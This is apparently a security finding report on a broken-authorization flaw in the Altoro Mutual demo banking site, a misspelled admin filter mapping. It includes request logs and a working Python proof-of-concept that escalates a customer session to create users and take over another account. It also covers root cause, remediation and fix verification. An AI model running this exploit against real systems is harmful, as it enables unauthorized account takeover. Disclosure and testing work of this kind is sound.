# Broken Function-Level Authorization: Any Authenticated Customer Can Invoke Admin Functions and Take Over Accounts

**ID:** vuln-0005
**Severity:** HIGH
**Found:** 2026-09-20 21:46:59 UTC
**Target:** http://demo.testfire.net
**Endpoint:** /admin/addUser
**Method:** POST
**CWE:** CWE-862
**CVSS:** 8.1
**Confidence:** High
**Fix Effort:** Low

## Description

The Altoro Mutual demo banking application does not enforce the administrator role on its administrative functions. Any authenticated customer — for example `jsmith`, an ordinary account holder with no administrative link in the UI — can directly invoke the site's admin functions (`/admin/admin.jsp`, `/admin/addUser`, `/admin/changePassword`, `/admin/addAccount`) and the corresponding REST endpoints (`/api/admin/addUser`, `/api/admin/changePassword`). This was demonstrated by using a normal customer session to create a new user, to create new bank accounts, and to reset the password of a pre-existing account that the attacker does not own and then authenticate as it.

## Evidence

Filter mapping in the deployed configuration (read from the application's `WEB-INF/web.xml`): AuthFilter protects `/admin/*` but AdminFilter is bound to a typo path and never runs:

```
<filter-mapping><filter-name>AuthFilter</filter-name><url-pattern>/admin/*</url-pattern>...</filter-mapping>
<filter-mapping><filter-name>AdminFilter</filter-name><url-pattern>/adimn/*</url-pattern>...</filter-mapping>
```

`AdminFilter` contains the actual role check that is thereby bypassed:

```java
if ((user != null && ((User)user).getRole() == Role.Admin) || (admObj != null && ...)) {
    chain.doFilter(req, resp); return;
} else if (request.getRequestURL().toString().endsWith("/admin/login.jsp") ...) { ... }
else if (user == null || !(user instanceof User)) { redirect("/login.jsp"); }
else { redirect("/bank/main.jsp"); }
```

jsmith is an ordinary customer — the bank page renders no administration link for it (that block is emitted only when `user.getRole() == User.Role.Admin`):

```
GET /bank/main.jsp  (as jsmith)  ->  contains 'ADMINISTRATION': False  |  '/admin/admin.jsp': False
GET /admin/admin.jsp (as jsmith) ->  HTTP 200, length 30460 (Edit User Information console)
```

Using jsmith's session, an administrative user is created and then authenticates:

```
POST /admin/addUser
firstname=Ev&lastname=Probe&username=evprobe_y3ued&password1=evpass123&password2=evpass123
-> HTTP 302 Location: admin.jsp
user appears in admin user list: True
POST /api/login {"username":"evprobe_y3ued","password":"evpass123"} -> HTTP 200
```

Password reset of a pre-existing account not owned by jsmith, followed by successful authentication as that account:

```
POST /admin/changePassword  username=test_normal_abc&password1=jsmithhacked1&password2=jsmithhacked1
-> HTTP 302
POST /doLogin uid=test_normal_abc&passw=jsmithhacked1  -> HTTP 302 Location: /bank/main.jsp (login successful)
```

Administrative account creation on an existing user (jsmith account list grew):

```
jsmith accounts before: 15   (800002..800023 + card)
POST /admin/addAccount username=jsmith&accttypes=Checking -> HTTP 302
jsmith accounts after: 16   new: 800026 ; repeated -> 800027
```

REST admin surface enforces login only, not role:

```
POST /api/admin/addUser (no Authorization)        -> HTTP 401  loggedIn=false / Please log in first
POST /api/admin/addUser (Bearer jsmith token)     -> HTTP 200  {"success":"Requested operation has completed successfully."}
POST /api/admin/changePassword (jsmith token)     -> HTTP 200  {"success":"Requested operation has completed successfully."}
```

## Impact

A low-privileged, authenticated customer is able to perform administrative operations that should require the admin role, resulting in full account takeover and privilege escalation. Demonstrated consequences: (1) creating arbitrary new user accounts that can then authenticate; (2) resetting the password of any existing user, including accounts the attacker does not own — the attacker then logs in as that victim (proven against account `test_normal_abc`); and (3) creating new bank accounts attached to any user. In effect, any customer can mint credentials and seize other customers' accounts, which for a banking application equates to complete compromise of customer authentication and account integrity. The administrative console, which also discloses the full user list and database schema, becomes readable by every logged-in user.

## Counterevidence

Actively challenged the finding: (1) "Is jsmith actually an administrator by design?" No — the application renders the admin navigation block only when `user.getRole() == User.Role.Admin`, and jsmith's `/bank/main.jsp` contains no administration link; jsmith is the seeded `'user'` account with a customer-only account set. The admin console is reached despite the UI never exposing it. (2) "Does the endpoint silently no-op (fake success)?" The web-servlet path produces real state changes: the created user appears in the persisted user list and authenticates, the password reset account authenticates with the attacker-chosen password, and the account list grows. (An initial round of tests appeared to no-op only because both login paths lowercase the password, which masked successful creates — this was identified and controlled for.) (3) "Is there a downstream role check?" `AdminServlet` and `AdminAPI` contain no role check, and `AdminFilter` never runs due to the URL-pattern typo; the only gate present on the API is the `enableAdminFunctions` behavior flag, which is not an authorization control. (4) "Is test_normal_abc my own artifact?" No — it pre-existed in the account list before testing and was reset with a new attacker-chosen password that then authenticated. Independent negative control: the same admin endpoints return `401` without any token, confirming that login is required and the missing element is specifically the admin-role authorization.

## What Would Change This Severity

Confirmation that the API admin handlers write state on a deployment where `enableAdminFunctions` is enabled (the flag is currently false) would broaden the already-serious web-console impact to every interface and argue for critical; conversely, if an external control (an authenticating reverse proxy or WAF) were proven to restrict `/admin/*` to staff, the reachable impact would drop and the severity would be lowered accordingly.

## Technical Analysis

The application separates two servlet filters: `AuthFilter` (checks only that a user is logged in) and `AdminFilter` (checks that the session user's role is `admin`). In `WebContent/WEB-INF/web.xml` the mappings are misconfigured:

- `AuthFilter` is mapped to `/admin/*` (correct).
- `AdminFilter` is mapped to `/adimn/*` — a misspelling of `/admin/*` — so `AdminFilter` never executes for real admin paths.

`AdminFilter.doFilter` enforces the role boundary with `user.getRole() == Role.Admin`; because the filter is bound to a path that does not exist, the check is effectively absent for every administrative route. `AdminServlet` (`/admin/addUser`, `/admin/changePassword`, `/admin/addAccount`) and `admin.jsp` contain no role check of their own and rely entirely on the (now bypassed) filter, so any authenticated session reaches them.

The REST layer has the same defect. `ApiAuthFilter` only verifies that the bearer token maps to a valid user via `DBUtil.isValidUser(username, password)`; it never verifies the user's role. Consequently `/api/admin/addUser` and `/api/admin/changePassword` accept any valid non-admin token (and return `401` only when no token is presented). The source even documents the gap: `AdminAPI.changePassword` carries the comment "Don't really care if the user is admin or not - I think that's how it works in AltoroJ". These API handlers additionally gate the database write on the non-security feature flag `enableAdminFunctions`, which is disabled on this deployment, so the API calls currently return success without writing; the web servlet path is not so gated and performs real state changes.

Root cause: function-level authorization is enforced by a filter mapped to a non-existent URL pattern, and is not enforced at all on the API admin resource. Authentication is required, but authorization (admin role) is not.

## Proof of Concept

1. Authenticate as the ordinary customer `jsmith` via `POST /doLogin` (uid=jsmith, passw=demo1234).
2. Confirm the session is not administrative: `GET /bank/main.jsp` renders no "ADMINISTRATION" section and no `/admin/admin.jsp` link (that section is only emitted when the user's role is `Admin`).
3. Request `GET /admin/admin.jsp` and observe HTTP 200 with the "Edit User Information" admin console.
4. Invoke the admin add-user function: `POST /admin/addUser` with firstname, lastname, username and matching password1/password2. Observe HTTP 302 to admin.jsp, then confirm the created account authenticates via `POST /api/login`.
5. Take over an existing, non-owned account: `POST /admin/changePassword` with `username=test_normal_abc` and an attacker-chosen password, then authenticate as `test_normal_abc` with that password via `POST /doLogin`.
6. Invoke `POST /admin/addAccount` (username=jsmith, accttypes=Checking) and observe a new account added to the user's account list.
7. Confirm the REST admin surface: `POST /api/admin/addUser` returns `401` without an Authorization header and `200 {"success":...}` when a normal user's bearer token is supplied.

```python
import requests, random, string

BASE = "http://demo.testfire.net"
s = requests.Session()

# 1. Log in as an ordinary customer
s.post(f"{BASE}/doLogin", data={"uid": "jsmith", "passw": "demo1234", "btnSubmit": "Login"})

# 2. Prove the session is NOT an admin session
main = s.get(f"{BASE}/bank/main.jsp").text
print("admin link shown to jsmith?",
      "ADMINISTRATION" in main or "/admin/admin.jsp" in main)   # -> False

# 3. Reach the admin console anyway
r = s.get(f"{BASE}/admin/admin.jsp")
print("GET /admin/admin.jsp ->", r.status_code, "| has console:",
      "Edit User Information" in r.text)                        # -> 200 | True

# 4. Create a brand new user through the admin function
new_user = "poc_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
s.post(f"{BASE}/admin/addUser", data={"firstname": "Poc", "lastname": "User",
       "username": new_user, "password1": "pocpass123", "password2": "pocpass123"})
login = requests.post(f"{BASE}/api/login",
                      json={"username": new_user, "password": "pocpass123"})
print("created user can authenticate:", login.status_code == 200)   # -> True

# 5. Take over an EXISTING account the attacker does not own
victim = "test_normal_abc"
s.post(f"{BASE}/admin/changePassword",
       data={"username": victim, "password1": "pocowned123", "password2": "pocowned123"})
v = requests.post(f"{BASE}/doLogin",
                  data={"uid": victim, "passw": "pocowned123", "btnSubmit": "Login"},
                  allow_redirects=False)
print("victim account taken over:",
      v.status_code == 302 and "main.jsp" in v.headers.get("Location", ""))   # -> True

# 6. Create a new bank account for the attacker (admin add-account function)
s.post(f"{BASE}/admin/addAccount", data={"username": "jsmith", "accttypes": "Checking"})

# 7. REST admin surface enforces no role either
tok = s.post(f"{BASE}/api/login",
             json={"username": "jsmith", "password": "demo1234"}).json()["Authorization"]
with_token = s.post(f"{BASE}/api/admin/addUser", headers={"Authorization": f"Bearer {tok}"},
                    json={"firstname": "A", "lastname": "B", "username": "x",
                          "password1": "p", "password2": "p"})
without_token = s.post(f"{BASE}/api/admin/addUser",
                       json={"firstname": "A", "lastname": "B", "username": "x",
                             "password1": "p", "password2": "p"})
print("api/admin/addUser with normal-user token:", with_token.status_code)   # -> 200
print("api/admin/addUser without token:", without_token.status_code)         # -> 401
```

## Remediation

1. Correct the AdminFilter mapping in `WebContent/WEB-INF/web.xml`: change the URL pattern from the misspelled `/adimn/*` to `/admin/*` so the administrator-role filter actually runs for every administrative route. This is the primary defect and closes the demonstrated web-console exploit.
2. Extend role enforcement to the REST administration surface. The URL-pattern-based AdminFilter does not cover the JAX-RS servlet, so `/api/admin/*` must be protected separately — for example by requiring the authenticated principal's role to be admin inside `ApiAuthFilter` for the `AdminAPI` resource class, or by invoking an equivalent role check at the start of each admin handler.
3. Do not rely on the `enableAdminFunctions` feature flag as a security control. It is a behavior toggle that is off by default and can be enabled by configuration; authorization must not depend on it.
4. Apply the principle of least privilege at the function boundary: each administrative handler (`addUser`, `changePassword`, `addAccount` and their API equivalents) should deny by default and re-verify the caller's role on every request, rather than trusting a single upstream filter that can be mis-mapped.
5. Add a regression test that authenticates as a known non-admin user and asserts that every `/admin/*` and `/api/admin/*` route returns an authorization failure (redirect to login/main or HTTP 403) and performs no state change.

## Fix Verification

Security closure: re-traced the exploit path against the corrected configuration. With `AdminFilter` mapped to `/admin/*`, every request to `/admin/admin.jsp`, `/admin/addUser`, `/admin/changePassword` and `/admin/addAccount` now passes through `AdminFilter.doFilter`, which requires `user.getRole() == Role.Admin` and otherwise redirects the caller to `/bank/main.jsp` (or `/login.jsp` when unauthenticated). A user such as `jsmith` (role `user`) can therefore no longer reach the servlet or console, so the demonstrated create-user, reset-password and add-account actions are blocked. Bypass review: checked the alternate transports and mappings without leaning on the rationale — the URL-based filter does not cover the JAX-RS servlet, so `/api/admin/*` remains a separate gap and is called out in remediation and a second code location rather than being silently considered fixed; confirmed the only servlet mappings that reach `AdminServlet` are the three `/admin/*` paths, and that `AdminFilter` still permits only `/admin/login.jsp` and `/admin/doAdminLogin` without a role. Preserved behavior: legitimate users whose role is `Admin` continue to pass the filter, `AuthFilter` remains mapped to `/admin/*`, and the redirect targets for non-admins are unchanged. Repository checks: applied the one-line change to the checkout, confirmed both `/admin/*` filter-mappings are present and the `adimn` token no longer exists, and parsed `WebContent/WEB-INF/web.xml` with an XML parser (well-formed). The API-side Java role check (second location) was not compiled or executed here as no build was run — that gate is a stated gap, which is why that location is recorded as informational rather than as an applyable suggestion.

## Assumptions

Exploitation requires a valid low-privileged account. `jsmith` / `demo1234` is the application's well-known demo customer credential and is also the hardcoded fallback login, so this prerequisite is trivially met. Referenced source is the application's public open-source code (AltoroJ) that matches the deployed build's behavior and filter classes. The target is an intentionally vulnerable demo with synthetic data, so severity is based on demonstrated technical impact (verified state changes and cross-account authentication) rather than real-world financial loss.
